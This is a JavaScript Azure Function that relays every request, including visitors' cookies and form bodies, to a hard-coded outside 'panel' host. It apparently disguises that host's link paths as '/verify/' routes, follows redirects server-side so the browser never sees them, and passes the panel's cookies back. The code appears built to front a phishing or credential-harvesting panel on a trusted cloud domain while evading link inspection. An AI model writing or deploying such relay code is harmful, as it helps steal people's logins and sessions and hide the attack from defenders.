const PANEL = 'tute.ink';

module.exports = async function (context, req) {
    let path = req.headers['x-ms-original-url'] || req.url || '/';
    try { if (path.startsWith('http')) { const u = new URL(path); path = u.pathname + u.search; } } catch(e){}
    path = path.replace(/^\/api\/proxy/, '');

    // 🚨 SMART ROUTING 🚨
    const parts = path.split('/').filter(Boolean);
    let originalRandomString = '';

    // FIX 1: never treat the literal "l" as the random string
    if (parts.length === 2 && parts[0] !== 'l' && parts[1].length > 4) {
        originalRandomString = parts[0];
        path = `/verify/${parts[1]}`;
    } else if (parts.length === 2 && parts[0] === 'l' && parts[1].length > 4) {
        // We were handed /l/CODE directly — synthesise a stable random string
        // from the code itself so the browser stays off /l/ forever.
        originalRandomString = require('crypto').createHash('sha1')
            .update(parts[1] + (req.headers['x-forwarded-for'] || ''))
            .digest('hex').slice(0, 12);
        path = `/verify/${parts[1]}`;
    } else if (parts.length === 1 && parts[0].length > 4 && parts[0] !== 'l') {
        path = `/verify/${parts[0]}`;
    }

    if (!path.startsWith('/')) path = '/' + path;

    if (req.query && Object.keys(req.query).length > 0) {
        const qs = new URLSearchParams(req.query).toString();
        if (!path.includes('?')) path += '?' + qs;
    }

    context.log('Forwarding to:', path);

    const baseHeaders = {
        'Host': PANEL,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': req.headers['accept'] || '*/*',
        'X-Ablegod-Worker': '1'
    };
    if (req.headers['cookie'])       baseHeaders['Cookie']       = req.headers['cookie'];
    if (req.headers['content-type']) baseHeaders['Content-Type'] = req.headers['content-type'];

    let body;
    if (!['GET','HEAD'].includes(req.method) && req.body) {
        body = typeof req.body === 'string' ? req.body : JSON.stringify(req.body);
        if (!baseHeaders['Content-Type']) baseHeaders['Content-Type'] = 'application/json';
    }

    try {
        // FIX 2 + 3: follow redirects server-side so the browser only ever
        // sees a final 200. Cap at 5 hops to avoid loops.
        let currentUrl = `https://${PANEL}${path}`;
        let r;
        for (let hop = 0; hop < 5; hop++) {
            r = await fetch(currentUrl, {
                method: req.method,
                headers: baseHeaders,
                body: body,
                redirect: 'manual'
            });
            const loc = r.headers.get('location');
            if (r.status >= 300 && r.status < 400 && loc) {
                // Normalise relative Location → absolute
                currentUrl = new URL(loc, currentUrl).toString();
                // Rewrite tute.ink → our own panel host so cookies stay valid
                currentUrl = currentUrl.replace(/^https:\/\/(www\.)?tute\.ink/, `https://${PANEL}`);
                context.log('Redirect hop', hop, '→', currentUrl);
                continue;
            }
            break;
        }

        const responseBody = await r.text();
        const contentType  = r.headers.get('content-type') || 'text/html';

        // If we somehow still have a 3xx, rewrite its Location for the browser.
        let location = r.headers.get('location') || '';
        if (location) {
            if (location.startsWith('/')) location = `https://${PANEL}${location}`;
            if (location.includes('/l/')) {
                const code = location.split('/l/')[1].split('?')[0];
                const rs = (originalRandomString && originalRandomString !== 'l')
                    ? originalRandomString
                    : require('crypto').createHash('sha1').update(code).digest('hex').slice(0,12);
                location = `/${rs}/${code}`;
            } else {
                const azureHost = req.headers['host'];
                location = location.replace(/^https:\/\/(www\.)?tute\.ink/, `https://${azureHost}`);
            }
        }

        const respHeaders = {
            'Content-Type': contentType,
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type, Authorization',
            'Cache-Control': 'no-store, no-cache, must-revalidate'
        };
        if (location) respHeaders['Location'] = location;
        const setCookie = r.headers.get('set-cookie');
        if (setCookie) respHeaders['Set-Cookie'] = setCookie;

        context.res = { status: r.status, headers: respHeaders, body: responseBody };
    } catch (e) {
        context.log('Error:', e.message);
        context.res = { status: 500, body: 'Proxy Error: ' + e.message };
    }
};
